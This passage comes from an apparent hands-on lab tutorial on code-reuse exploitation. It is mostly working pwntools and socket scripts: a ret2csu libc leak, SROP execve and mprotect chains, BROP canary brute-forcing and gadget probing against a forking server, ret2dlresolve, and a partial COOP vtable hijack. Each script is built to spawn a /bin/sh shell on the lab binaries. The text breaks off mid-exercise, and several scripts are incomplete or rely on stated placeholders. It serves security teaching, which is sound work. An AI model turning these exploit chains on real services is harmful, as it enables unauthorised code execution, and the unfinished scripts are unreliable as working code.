    chain += p64(0) * 7              # consume: rbx,rbp,r12,r13,r14,r15 + alignment
    return chain

# --- Exploit ---
p = process("./vuln_ret2csu")
p.recvuntil(b"challenge")

# Use ret2csu to call write(1, GOT[puts], 8) → leak puts libc address
# write is in GOT, so we need its GOT address as the call target
# func_got must be an address CONTAINING the function pointer (i.e., a GOT entry)
WRITE_GOT = elf.got["write"] if "write" in elf.got else elf.got["puts"]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

# Determine CSU offsets precisely
csu_init_addr = elf.symbols['__libc_csu_init']
# Scan for the specific byte patterns
csu_code = elf.read(csu_init_addr, 0x80)

payload  = b"A" * 72  # overflow padding

# Simple approach: if we have pop rdi, just use standard ret2libc
# ret2csu is for when pop rdi/rsi/rdx are missing
# Demonstrate ret2csu for the write(1, GOT[puts], 8) call:
if CSU_POP and CSU_CALL:
    payload += ret2csu(
        func_got=elf.got["write"],
        rdi_32=1,                    # fd=stdout (fits in 32 bits)
        rsi=elf.got["puts"],         # buf=GOT[puts] address
        rdx=8,                       # count=8 bytes
        csu_pop=CSU_POP,
        csu_call=CSU_CALL
    )
    # After write executes, chain falls through to main
    payload += p64(elf.symbols["main"])
else:
    # Fallback: standard approach if csu not found
    payload += p64(POP_RDI)
    payload += p64(elf.got["puts"])
    payload += p64(elf.plt["puts"])
    payload += p64(elf.symbols["main"])

p.sendafter(b"Input: ", payload)

# Parse leak
leaked = u64(p.recv(8).ljust(8, b"\x00"))
libc.address = leaked - libc.symbols.get("write", libc.symbols["puts"])
log.success(f"libc base = {hex(libc.address)}")

# Stage 2: standard system("/bin/sh")
bin_sh = next(libc.search(b"/bin/sh\x00"))
payload2  = b"A" * 72
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols["system"])

p.sendafter(b"Input: ", payload2)
p.interactive()
```

**Key takeaway:** ret2csu is invaluable when the binary lacks separate `pop rdx; ret` or `pop rsi; ret` gadgets. Limitation: `edi` is only 32-bit (zeroes upper 32 bits of rdi). On glibc 2.34+, `__libc_csu_init` is removed — must use alternative techniques (ret2dlresolve, libc gadgets).

---

### Exercise 4: Sigreturn-Oriented Programming (SROP)

**Objective:** Forge a signal frame to achieve arbitrary syscall execution using only 2 gadgets: `syscall; ret` and `pop rax; ret`.

#### Step 4.1: SROP Theory and Target Analysis

```bash
# SROP minimal requirements:
# 1. A "syscall; ret" gadget
# 2. A way to set rax = 15 (SYS_rt_sigreturn)
# 3. Enough stack space for a sigreturn frame (~248 bytes)

checksec --file=vuln_srop_c
# Expected: static binary, no PIE, no protections

# Find our minimal gadgets
ROPgadget --binary vuln_srop_c --only "syscall|ret"
ROPgadget --binary vuln_srop_c --only "pop|ret" | grep "pop rax"

# Also find the "/bin/sh" string
ROPgadget --binary vuln_srop_c --string "/bin/sh"
# Or: strings -t x vuln_srop_c | grep "/bin/sh"
```

#### Step 4.2: SROP execve("/bin/sh") Exploit

```python
#!/usr/bin/env python3
"""
Exercise 4: SROP — execve('/bin/sh', NULL, NULL) via forged sigreturn frame.
Only needs: pop rax;ret + syscall;ret + writable "/bin/sh" address.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

elf = ELF("./vuln_srop_c")

# Find gadget addresses (static binary, fixed)
# Search for them
SYSCALL_RET = None
POP_RAX_RET = None
BINSH_ADDR = None

# Automated search
for addr in elf.search(asm("syscall\nret")):
    SYSCALL_RET = addr
    break

for addr in elf.search(asm("pop rax\nret")):
    POP_RAX_RET = addr
    break

for addr in elf.search(b"/bin/sh\x00"):
    BINSH_ADDR = addr
    break

# Fallback: use ROPgadget output
if not SYSCALL_RET:
    log.warning("Auto-search failed; set SYSCALL_RET manually from ROPgadget output")
    # Example: SYSCALL_RET = 0x401032

log.info(f"syscall; ret  = {hex(SYSCALL_RET) if SYSCALL_RET else 'NOT FOUND'}")
log.info(f"pop rax; ret  = {hex(POP_RAX_RET) if POP_RAX_RET else 'NOT FOUND'}")
log.info(f"/bin/sh addr  = {hex(BINSH_ADDR) if BINSH_ADDR else 'NOT FOUND'}")

assert all([SYSCALL_RET, POP_RAX_RET, BINSH_ADDR]), "Missing gadgets!"

# Construct the forged sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve    # 59 — execve syscall number
frame.rdi = BINSH_ADDR              # filename = "/bin/sh"
frame.rsi = 0                       # argv = NULL
frame.rdx = 0                       # envp = NULL
frame.rip = SYSCALL_RET             # after sigreturn, execute syscall;ret
frame.rsp = 0xdeadbeefcafe0000      # doesn't matter — execve doesn't return

log.info(f"SigreturnFrame size: {len(bytes(frame))} bytes")

# Payload layout on stack:
# [overflow_padding] [pop_rax;ret] [15] [syscall;ret] [sigframe...]
#
# Execution flow:
# 1. ret → pop rax; ret → rax = 15 (SYS_rt_sigreturn)
# 2. ret → syscall; ret → kernel reads sigframe from stack
# 3. Kernel restores ALL registers from sigframe:
#    rax=59, rdi="/bin/sh", rsi=0, rdx=0, rip=syscall;ret
# 4. Execution resumes at rip (syscall;ret) with registers set → execve fires

# Determine overflow offset (read disassembly to find buffer size)
# For vuln_srop_c: buffer is 128 bytes at [rsp-128], no saved rbp in _start
# Offset depends on exact compilation — adjust as needed
OFFSET = 136  # 128 buf + 8 alignment (verify via pattern)

payload  = b"A" * OFFSET
payload += p64(POP_RAX_RET)
payload += p64(constants.SYS_rt_sigreturn)  # 15
payload += p64(SYSCALL_RET)
payload += bytes(frame)

log.info(f"Total payload size: {len(payload)} bytes")

p = process("./vuln_srop_c")
p.sendafter(b"SROP> ", payload)

log.success("SROP chain fired — expecting shell")
p.interactive()
```

#### Step 4.3: Multi-Stage SROP — mprotect + Read Shellcode

```python
#!/usr/bin/env python3
"""
Exercise 4.3: Chained SROP — mprotect(RWX) → read(shellcode) → execute.
Demonstrates SROP's ability to chain multiple syscalls.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = ELF("./vuln_srop_c")

# Gadgets (same as 4.2)
SYSCALL_RET = next(elf.search(asm("syscall\nret")))
POP_RAX_RET = next(elf.search(asm("pop rax\nret")))

# Choose a writable region for shellcode (BSS or known page)
# Static binary: .bss is at a fixed address
BSS_ADDR = elf.bss()
WRITABLE_PAGE = BSS_ADDR & ~0xfff  # page-align

log.info(f"Target page for shellcode: {hex(WRITABLE_PAGE)}")

# Frame 1: mprotect(WRITABLE_PAGE, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_mprotect    # 10
frame1.rdi = WRITABLE_PAGE             # page-aligned address
frame1.rsi = 0x2000                    # 2 pages
frame1.rdx = 7                         # PROT_READ|PROT_WRITE|PROT_EXEC
frame1.rip = SYSCALL_RET               # execute mprotect
# After mprotect returns, we need to chain to frame 2.
# Set RSP to point where frame 2's trigger will be:
FRAME2_TRIGGER = WRITABLE_PAGE + 0x800  # arbitrary offset in our RWX region
frame1.rsp = FRAME2_TRIGGER

# Frame 2: read(0, WRITABLE_PAGE, 0x200)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_read        # 0
frame2.rdi = 0                         # stdin
frame2.rsi = WRITABLE_PAGE             # write shellcode here
frame2.rdx = 0x200                     # read up to 512 bytes
frame2.rip = WRITABLE_PAGE             # after read, jump to shellcode!
frame2.rsp = WRITABLE_PAGE + 0xf00     # doesn't matter

# Build frame 2 trigger (placed at FRAME2_TRIGGER via mprotect+subsequent write)
frame2_trigger  = p64(POP_RAX_RET)
frame2_trigger += p64(constants.SYS_rt_sigreturn)
frame2_trigger += p64(SYSCALL_RET)
frame2_trigger += bytes(frame2)

# Build main payload (goes on original stack)
OFFSET = 136
payload  = b"A" * OFFSET
payload += p64(POP_RAX_RET)
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(SYSCALL_RET)
payload += bytes(frame1)

# The trick: after mprotect, RSP = FRAME2_TRIGGER.
# But that memory isn't written yet! We need frame2_trigger there.
# Solution: write frame2_trigger to WRITABLE_PAGE+0x800 BEFORE the exploit.
# In a static binary scenario, we'd need a writable region that persists.
# Alternative: place frame2 trigger in the initial payload at a fixed stack offset.
#
# Simpler approach for lab: if the binary gives us enough stack space,
# chain both frames on the same stack:

# Combined single-stack SROP chain:
payload_combined  = b"A" * OFFSET
# Trigger frame 1: mprotect
payload_combined += p64(POP_RAX_RET)
payload_combined += p64(15)
payload_combined += p64(SYSCALL_RET)
# Frame 1: mprotect — set rsp to point right after frame1 on this same stack
current_rsp_after_frame1 = OFFSET + 8 + 8 + 8 + len(bytes(frame1))
# This is complex — in practice, we know the stack address via a leak.
# For this lab, use execve SROP (Exercise 4.2) as the primary demo.

log.info("Multi-stage SROP requires stack address knowledge.")
log.info("In CTF practice, combine with a stack leak or use fixed addresses.")
log.info("The single-frame execve approach (Exercise 4.2) is more practical.")

# Demonstrate shellcode version if we already know stack addr:
shellcode = asm(shellcraft.sh())
log.info(f"Shellcode ({len(shellcode)} bytes): {shellcode.hex()[:40]}...")
```

**SROP power:** The entire register file is set from pure data. Only 2 gadgets needed for arbitrary syscalls. Limitation: requires enough writable stack space for the ~248-byte frame.

---

### Exercise 5: Blind ROP (BROP) — Remote Canary Brute-Force

**Objective:** Exploit a forking server with stack canaries by brute-forcing the canary byte-by-byte, then leaking the binary via `write@PLT`.

#### Step 5.1: Start the BROP Target

```bash
# Start the forking server (on target VM or same machine)
cd ~/code_reuse_lab/binaries
./vuln_brop &
BROP_PID=$!
echo "BROP server PID: $BROP_PID, port 9999"

# Verify it's running
nc -z localhost 9999 && echo "Server reachable"
```

#### Step 5.2: Canary Brute-Force

```python
#!/usr/bin/env python3
"""
Exercise 5.2: BROP Phase 1 — byte-by-byte canary brute-force.
Exploits fork()'s property: child inherits parent's exact memory layout,
including the same stack canary, same ASLR, same code.
"""
import socket
import sys
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999
OVERFLOW_LEN = 64    # buffer size (char buf[BUFSIZE=64] in vuln_brop.c)
CANARY_LEN = 8       # 8 bytes on x86_64

TIMEOUT = 2
DELAY = 0.01         # small delay between attempts to avoid overwhelming

def try_canary_byte(known_bytes: bytes, guess_byte: int) -> bool:
    """
    Send: padding + known_canary_bytes + guess_byte
    If the server responds (child doesn't crash), the byte is correct.
    If connection is reset/times out, the canary mismatch killed the child.
    """
    payload = b"A" * OVERFLOW_LEN + known_bytes + bytes([guess_byte])

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.recv(1024)  # consume "BROP> " prompt

        s.send(payload + b"\n")
        time.sleep(DELAY)

        # Try to read a response
        response = s.recv(1024)
        s.close()

        # If we got "OK\n", the child survived → byte is correct
        return b"OK" in response
    except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
        return False

def brute_force_canary() -> bytes:
    """Recover the full 8-byte canary."""
    canary = b""

    print(f"[*] Starting canary brute-force (max {CANARY_LEN * 256} attempts)")
    print(f"[*] First byte is likely 0x00 (NUL terminator defense)")

    for position in range(CANARY_LEN):
        found = False
        attempts = 0

        # Optimization: first byte is almost always 0x00
        start_range = range(256)
        if position == 0:
            start_range = [0x00]  # try NUL first

        for guess in start_range:
            attempts += 1
            if try_canary_byte(canary, guess):
                canary += bytes([guess])
                print(f"[+] Byte {position}: 0x{guess:02x}  "
                      f"(canary: {canary.hex()}) [{attempts} attempts]")
                found = True
                break

        if not found and position == 0:
            # NUL didn't work for first byte (unusual) — try all
            for guess in range(1, 256):
                attempts += 1
                if try_canary_byte(canary, guess):
                    canary += bytes([guess])
                    print(f"[+] Byte {position}: 0x{guess:02x}  "
                          f"(canary: {canary.hex()}) [{attempts} attempts]")
                    found = True
                    break

        if not found:
            print(f"[-] FAILED at byte {position} after {attempts} attempts")
            sys.exit(1)

    return canary

def brute_force_saved_rbp(canary: bytes) -> bytes:
    """After recovering canary, brute-force the 8-byte saved RBP."""
    print("\n[*] Phase 2: Brute-forcing saved RBP...")
    rbp = b""

    for position in range(8):
        for guess in range(256):
            payload = b"A" * OVERFLOW_LEN + canary + rbp + bytes([guess])
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TIMEOUT)
                s.connect((TARGET_HOST, TARGET_PORT))
                s.recv(1024)
                s.send(payload + b"\n")
                time.sleep(DELAY)
                response = s.recv(1024)
                s.close()
                if b"OK" in response:
                    rbp += bytes([guess])
                    print(f"[+] RBP byte {position}: 0x{guess:02x}  (rbp: {rbp.hex()})")
                    break
            except:
                continue
        else:
            print(f"[-] RBP byte {position} failed")
            break

    return rbp

if __name__ == "__main__":
    start_time = time.time()

    canary = brute_force_canary()
    print(f"\n[+] Full canary: 0x{canary.hex()}")
    print(f"[+] Recovered in {time.time() - start_time:.1f} seconds")

    # Phase 2: recover saved RBP
    saved_rbp = brute_force_saved_rbp(canary)
    print(f"[+] Saved RBP: 0x{saved_rbp.hex()}")

    # Phase 3: probe for RIP control
    print("\n[*] Phase 3: With canary + RBP known, full ROP chain can be deployed")
    print(f"[*] Payload template: b'A'*64 + canary + rbp + ROP_CHAIN")
    print(f"[*] Next: locate PLT entries via stop-gadget probing (see Exercise 5.3)")
```

#### Step 5.3: Stop-Gadget Probing and Binary Exfiltration

```python
#!/usr/bin/env python3
"""
Exercise 5.3: BROP Phase 3+4 — find stop gadgets, locate PLT, exfiltrate binary.
Requires: canary from Exercise 5.2.
"""
import socket
import struct
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999
OVERFLOW_LEN = 64
TIMEOUT = 2

# From Exercise 5.2 (replace with actual values):
CANARY = bytes.fromhex("0011223344556677")  # placeholder
SAVED_RBP = b"\x00" * 8

def send_probe(ret_addr: int, extra: bytes = b"") -> str:
    """
    Send overflow + canary + rbp + ret_addr and observe behavior.
    Returns: "alive" (got response), "hang" (timeout), "crash" (connection reset)
    """
    payload = b"A" * OVERFLOW_LEN + CANARY + SAVED_RBP + struct.pack("<Q", ret_addr)
    payload += extra

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.recv(1024)
        s.send(payload + b"\n")
        time.sleep(0.1)
        response = s.recv(4096)
        s.close()
        if len(response) > 0:
            return "alive"
        return "hang"
    except socket.timeout:
        return "hang"
    except (ConnectionResetError, BrokenPipeError, OSError):
        return "crash"

def find_stop_gadget(base: int = 0x400000, end: int = 0x402000) -> int:
    """
    A stop gadget is an address that causes the server to respond normally
    (hang or specific response) rather than crash. Used as a "canary" in
    subsequent gadget probing.
    """
    print(f"[*] Scanning for stop gadgets in {hex(base)}-{hex(end)}...")

    for addr in range(base, end, 8):
        result = send_probe(addr)
        if result == "hang":
            print(f"[+] Stop gadget (hang): {hex(addr)}")
            return addr

    print("[-] No stop gadget found")
    return 0

def identify_pop_gadgets(stop_gadget: int, base: int = 0x400000) -> dict:
    """
    Probe for pop;ret gadgets using the stop gadget as a sentinel.
    If address X is 'pop rdi; ret', then:
    - overflow + X + dummy + stop_gadget → should "hang" (pop consumed dummy, ret to stop)
    - overflow + X + stop_gadget → should "crash" (pop consumed stop_gadget, ret to garbage)
    """
    gadgets = {}
    print(f"\n[*] Probing for POP gadgets using stop gadget {hex(stop_gadget)}...")

    for addr in range(base, base + 0x2000, 1):
        # Test: does this address pop exactly 1 value then ret?
        # payload: addr | dummy | stop_gadget
        result_1pop = send_probe(addr, extra=p64(0x4141414141414141) + p64(stop_gadget))

        if result_1pop == "hang":
            # Verify it's not a stop gadget itself
            result_direct = send_probe(addr)
            if result_direct == "crash":
                # It popped 1 value (the dummy) and returned to stop_gadget
                print(f"[+] pop ???; ret at {hex(addr)}")
                gadgets[addr] = "pop_1_ret"

    return gadgets

def find_plt_write(canary: bytes, rbp: bytes, pop_rdi: int,
                   stop_gadget: int, socket_fd: int = 4) -> int:
    """
    Locate write@PLT by calling candidate addresses with:
      rdi=socket_fd, rsi=some_known_address, rdx=length
    If the candidate is write@PLT, we receive data back on the socket.
    """
    print(f"\n[*] Probing for write@PLT (fd={socket_fd})...")

    # PLT entries are typically at 0x401000-0x401100 in no-PIE binaries
    for plt_candidate in range(0x401000, 0x401200, 0x10):
        # ROP chain: pop rdi → socket_fd; pop rsi → known_addr; plt_candidate
        # Need pop_rsi too — simplified: try with whatever registers are set
        # More realistically, use ret2csu or just try plt candidates directly

        payload  = b"A" * OVERFLOW_LEN + canary + rbp
        payload += p64(pop_rdi)
        payload += p64(socket_fd)          # rdi = socket fd
        # Skip rsi/rdx setup for now — hope they have useful values
        payload += p64(plt_candidate)
        payload += p64(stop_gadget)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.recv(1024)
            s.send(payload + b"\n")
            time.sleep(0.5)
            data = s.recv(4096)
            s.close()

            if len(data) > 10:
                print(f"[+] Possible write@PLT at {hex(plt_candidate)}")
                print(f"    Received {len(data)} bytes: {data[:32].hex()}")
                return plt_candidate
        except:
            continue

    return 0

# Utility
def p64(val):
    return struct.pack("<Q", val)

if __name__ == "__main__":
    print("=== BROP Phase 3: Stop Gadget + Gadget Probing ===")
    print("[!] Requires correct CANARY from Phase 1")
    print("[!] Replace CANARY placeholder with actual brute-forced value\n")

    stop = find_stop_gadget()
    if stop:
        gadgets = identify_pop_gadgets(stop)
        print(f"\n[+] Found {len(gadgets)} potential pop gadgets")
```

**BROP detection surface:** Thousands of child crashes in rapid succession. Monitor `__stack_chk_fail` frequency and per-PID crash rates.

---

### Exercise 6: ret2dlresolve — Resolve Arbitrary Symbols Without Info Leak

**Objective:** Exploit the ELF lazy binding mechanism to resolve `system` without leaking a libc address, bypassing ASLR entirely.

#### Step 6.1: Understanding the dl-resolve Mechanism

```bash
# Examine the PLT/GOT structure
readelf -r vuln_ret2dl | head -20       # .rela.plt entries
readelf --dyn-syms vuln_ret2dl | head -20   # .dynsym symbols
readelf -S vuln_ret2dl | grep -E "\.dynstr|\.dynsym|\.rela\.plt|\.got\.plt"

# Key addresses for ret2dlresolve:
# DT_JMPREL  = base of .rela.plt
# DT_SYMTAB  = base of .dynsym
# DT_STRTAB  = base of .dynstr
# PLT[0]     = the _dl_fixup resolver stub

# How lazy binding works:
# 1. call func@PLT → jmp *GOT[func]
# 2. First call: GOT[func] = PLT+6 (push reloc_index; jmp PLT[0])
# 3. PLT[0] → _dl_fixup(link_map, reloc_index)
# 4. _dl_fixup reads: JMPREL[reloc_index] → Elf64_Rela
# 5. Rela.r_info >> 32 → symbol index in SYMTAB
# 6. SYMTAB[sym_idx].st_name → offset in STRTAB → "func" string
# 7. Resolves "func" in libc, writes address to GOT, calls it
#
# The attack: forge Elf64_Rela + Elf64_Sym + "system" at a writable address.
# Point the forged reloc_index to our forgeries. _dl_fixup resolves "system"
# and calls it with our argument!
```

#### Step 6.2: ret2dlresolve Exploit with pwntools Helper

```python
#!/usr/bin/env python3
"""
Exercise 6: ret2dlresolve — resolve system("/bin/sh") without any info leak.
Uses pwntools' Ret2dlresolvePayload to automate structure forging.
Target: vuln_ret2dl (no PIE, no RELRO, no canary)
"""
from pwn import *

context.binary = elf = ELF("./vuln_ret2dl")
context.log_level = "info"

# Create the ret2dlresolve payload
# This forges Elf64_Rela + Elf64_Sym + "system\x00" at a writable address
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

log.info(f"Forged structures at: {hex(dlresolve.data_addr)}")
log.info(f"Payload size: {len(dlresolve.payload)} bytes")

# Build ROP chain:
# 1. read(0, dlresolve.data_addr, len(dlresolve.payload))
#    → write forged structures to BSS
# 2. ret2dlresolve(dlresolve)
#    → trigger _dl_fixup with our forged relocation index
rop = ROP(elf)
rop.read(0, dlresolve.data_addr)        # stage forged structs
rop.ret2dlresolve(dlresolve)            # trigger resolution + call

log.info(f"ROP chain:\n{rop.dump()}")

# Assemble payload
payload  = b"A" * 72                    # overflow (64 buf + 8 rbp)
payload += rop.chain()

p = process("./vuln_ret2dl")
p.sendafter(b"Input: ", payload)

# Send the forged dlresolve structures (consumed by the read() call)
p.send(dlresolve.payload)

log.success("system('/bin/sh') resolved via ret2dlresolve!")
p.interactive()
```

#### Step 6.3: Manual ret2dlresolve (Understanding the Internals)

```python
#!/usr/bin/env python3
"""
Exercise 6.3: Manual ret2dlresolve — forge structures by hand.
Educational: understand exactly what pwntools automates.
"""
from pwn import *
import struct

context.binary = elf = ELF("./vuln_ret2dl")
context.log_level = "info"

# Read ELF dynamic section values
JMPREL = elf.dynamic_value_by_tag("DT_JMPREL")   # .rela.plt base address
SYMTAB = elf.dynamic_value_by_tag("DT_SYMTAB")   # .dynsym base address
STRTAB = elf.dynamic_value_by_tag("DT_STRTAB")   # .dynstr base address

log.info(f"JMPREL (.rela.plt) = {hex(JMPREL)}")
log.info(f"SYMTAB (.dynsym)   = {hex(SYMTAB)}")
log.info(f"STRTAB (.dynstr)   = {hex(STRTAB)}")

# PLT[0] — the _dl_fixup stub
plt_section = elf.get_section_by_name(".plt")
PLT0 = plt_section.header.sh_addr
log.info(f"PLT[0]             = {hex(PLT0)}")

# Choose staging area (end of .bss, page-aligned for safety)
FORGE_BASE = (elf.bss() + 0x200) & ~0x7  # 8-byte aligned

log.info(f"Forge base         = {hex(FORGE_BASE)}")

# Layout at FORGE_BASE:
#   +0x000: Elf64_Rela    (24 bytes: r_offset, r_info, r_addend)
#   +0x018: padding to align Elf64_Sym (0-7 bytes)
#   +0x018: Elf64_Sym     (24 bytes: st_name, st_info, st_other, st_shndx, st_value, st_size)
#   +0x030: "system\x00"  (7 bytes)
#   +0x037: "/bin/sh\x00" (8 bytes)

# Elf64_Sym is 24 bytes and SYMTAB entries are at 24-byte intervals.
# The symbol index = (our_sym_addr - SYMTAB) / 24
# This must be an INTEGER. So our_sym_addr must be SYMTAB + N*24.
# Calculate the required alignment:
SYM_ADDR = FORGE_BASE + 24  # right after Elf64_Rela

# Verify alignment: (SYM_ADDR - SYMTAB) must be divisible by 24
sym_offset = SYM_ADDR - SYMTAB
if sym_offset % 24 != 0:
    # Adjust FORGE_BASE to fix alignment
    adjustment = 24 - (sym_offset % 24)
    FORGE_BASE += adjustment
    SYM_ADDR = FORGE_BASE + 24
    sym_offset = SYM_ADDR - SYMTAB
    log.info(f"Adjusted FORGE_BASE = {hex(FORGE_BASE)} (sym alignment fix)")

sym_index = sym_offset // 24
log.info(f"Symbol index: {sym_index}")

RELA_ADDR = FORGE_BASE
STR_ADDR = SYM_ADDR + 24      # "system\x00" string
BINSH_ADDR = STR_ADDR + 7     # "/bin/sh\x00"

# Compute relocation index
reloc_offset = RELA_ADDR - JMPREL
assert reloc_offset % 24 == 0, "Rela alignment error"
reloc_index = reloc_offset // 24
log.info(f"Relocation index: {reloc_index}")

# Forge Elf64_Rela:
#   r_offset = writable address for GOT slot (doesn't matter much — use FORGE+0x100)
#   r_info   = (sym_index << 32) | R_X86_64_JUMP_SLOT (type=7)
#   r_addend = 0
r_offset = FORGE_BASE + 0x100
r_info = (sym_index << 32) | 7
forged_rela = struct.pack("<QQq", r_offset, r_info, 0)

# Forge Elf64_Sym:
#   st_name  = offset of "system" from STRTAB base
#   st_info  = 0x12 (STB_GLOBAL | STT_FUNC)
#   st_other = 0
#   st_shndx = 0
#   st_value = 0
#   st_size  = 0
st_name = STR_ADDR - STRTAB
forged_sym = struct.pack("<IBBHQQ", st_name, 0x12, 0, 0, 0, 0)

# Symbol name + argument
forged_str = b"system\x00"
forged_binsh = b"/bin/sh\x00"

# Complete forged payload
forged_data = forged_rela + forged_sym + forged_str + forged_binsh
log.info(f"Forged data size: {len(forged_data)} bytes")

# ROP chain: read(0, FORGE_BASE, len) → PLT[0](reloc_index) with rdi="/bin/sh"
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

# Stage 1: read forged structures into BSS
# Use ret2csu or simplified approach depending on available gadgets
rop.call('read', [0, FORGE_BASE, len(forged_data)])

# Stage 2: set rdi = BINSH_ADDR, then call PLT[0] with reloc_index
# PLT[0] calling convention: push link_map (already on stack from PLT stub)
# Actually, calling PLT[0] directly requires the reloc_index pushed on stack.
# The simpler approach: point at PLT stub address that pushes our reloc_index.
# But we forged the reloc — we need to push it ourselves:
rop.raw(POP_RDI)
rop.raw(BINSH_ADDR)
rop.raw(RET)  # alignment
# Push reloc_index and jump to PLT[0]:
# This is architecture-specific. On x86_64, PLT[0] expects:
#   [rsp] = reloc_index
#   [rsp+8] = link_map (pushed by PLT stub)
# Simpler: use the pwntools version from 6.2 :)

log.info("Manual ret2dlresolve demonstrates the internal mechanism.")
log.info("For production exploits, use Ret2dlresolvePayload (Exercise 6.2).")
```

**ret2dlresolve power:** No info leak needed. Works against ASLR without any prior address knowledge. Only requires: writable segment + ROP chain for `read()` + PLT[0] accessibility.

---

### Exercise 7: Jump-Oriented Programming (JOP) and Call-Oriented Programming (COP)

**Objective:** Build JOP dispatcher chains and exploit C++ virtual dispatch (COOP) for control-flow hijack via legitimate virtual method bodies.

#### Step 7.1: JOP Dispatcher Concept

```bash
# Find potential dispatcher gadgets in the JOP target
ROPgadget --binary vuln_jop | grep -E "jmp (rax|rbx|rcx|rdx|rsi|rdi)"
ROPgadget --binary vuln_jop | grep -E "mov .*, \[" | grep -v ret

# A dispatcher gadget pattern:
#   mov rax, [reg]    ; load next target from table
#   add reg, 8        ; advance table pointer
#   jmp rax           ; dispatch

# Also search libc for more dispatcher candidates
LIBC=$(ldd vuln_jop | grep libc | awk '{print $3}')
ropper -f "$LIBC" --search "jmp rax" | head -10
ropper -f "$LIBC" --search "call rax" | head -10
```

#### Step 7.2: COP/COOP — Vtable Hijack Exploit

```python
#!/usr/bin/env python3
"""
Exercise 7.2: COOP-style attack — corrupt a C++ object's vtable pointer
to redirect virtual dispatch to Commander::execute() which calls system().
Target: vuln_coop
"""
from pwn import *

context.binary = elf = ELF("./vuln_coop")
context.log_level = "info"

p = process("./vuln_coop")

# Parse leaked addresses
p.recvuntil(b"Widget 0 at: ")
widget0_addr = int(p.recvline().strip(), 16)
log.info(f"Widget[0] at: {hex(widget0_addr)}")

p.recvuntil(b"Commander vtable hint: ")
commander_typeinfo = int(p.recvline().strip(), 16)
log.info(f"Commander typeinfo at: {hex(commander_typeinfo)}")

# Strategy: overwrite widget[0]'s memory to look like a Commander object
# with cmd = "/bin/sh". When the dispatch loop calls w->execute(),
# it dispatches via the Commander vtable → system("/bin/sh").

# C++ object layout (typical Itanium ABI):
#   offset 0x00: vtable pointer (points to array of virtual function pointers)
#   offset 0x08: member data (e.g., cmd[64])
#
# Commander's vtable (in .rodata) has:
#   vtable[0] = Commander::execute (which calls system(this->cmd))
#   vtable[1] = Commander::~Commander
#
# We need to know the Commander vtable address. In no-PIE binary,
# we can find it via objdump or GDB:
#   objdump -C -d vuln_coop | grep "vtable for Commander"
#   Or: readelf -S vuln_coop to find .rodata, then search

# For the lab, let's find it dynamically with GDB or statically:
# The hint gives us typeinfo — vtable is typically 16 bytes before typeinfo
# (Itanium C++ ABI: vtable layout has RTTI pointer at offset -8 from start)

# Alternative: use nm/objdump
# nm -C vuln_coop | grep "vtable"
# Expected output: 0x404xxx V vtable for Commander

# For this exercise, use pwntools to search for the vtable pattern:
# Commander::execute calls system(), so search for the GOT entry reference

# Simplified approach: overwrite object with [vtable_ptr]["/bin/sh\x00"...]
# where vtable_ptr points to a fake vtable we control (in the same buffer)

# Layout of our overwrite (256 bytes):
# Offset 0x00: vtable_ptr → points to offset 0x48 in our buffer (fake vtable)
# Offset 0x08: "/bin/sh\x00" + padding (this becomes this->cmd for Commander)
# Offset 0x48: fake vtable → [system@PLT address]

# But wait — we need Commander's actual vtable address so the correct
# execute() method is called. In COOP, we reuse EXISTING vtables.
# The program already has Commander in its code — we just need its vtable ptr.

# Let's read it from the binary:
# g++ places vtables in .rodata or .data.rel.ro
# Search for the address pattern:
commander_vtable = None

# Search for Commander::execute in the binary
for sym in elf.symbols:
    if "Commander" in sym and "execute" not in sym:
        pass

# Manual approach for lab: compile with symbols, find via:
# readelf -Ws vuln_coop | grep -i commander
# nm -C vuln_coop | grep vtable
# Let's just use the system@PLT trick:

# COOP insight: we DON'T need to call system directly.
# We make widget[0] look like a Commander object, pointing to Commander's
# real vtable. Then widget[0]->execute() naturally calls system(this->cmd).
# We just set this->cmd = "/bin/sh".

# Find Commander vtable address from binary:
# In stripped binary, search .rodata for pattern matching Commander's vtable
# The vtable contains pointers to Commander::execute and Commander::~Commander
# Both are in .text section (0x400000-0x401fff range for small no-PIE)

# For this lab, extract via GDB:
log.info("Finding Commander vtable via binary analysis...")
log.info("Run: nm -C vuln_coop | grep 'vtable for Commander'")
log.info("Or in GDB: info vtbl <commander_object>")

# Demonstration payload (placeholder vtable — replace with actual):
# Typical Commander vtable location for this binary:
# Try common vtable region (.data.rel.ro)
data_relro = elf.get_section_by_name(".data.rel.ro")
if data_relro:
    vtable_region = data_relro.header.sh_addr
    log.info(f".data.rel.ro at {hex(vtable_region)}")

# Construct fake Commander object:
# Use system@PLT as the vtable entry (single-level indirection)
SYSTEM_PLT = elf.plt.get("system", 0)
if SYSTEM_PLT:
    # Build fake vtable in our buffer
    # The vtable pointer in the object points to an array of function pointers
    # execute() is typically vtable[0] (first virtual method after RTTI)

    # Object layout we'll write:
    # [0x00]: pointer to our fake vtable (located at widget0_addr + 0x48)
    # [0x08]: "/bin/sh\x00" + padding (this is where this->cmd lives)
    # [0x48]: fake vtable
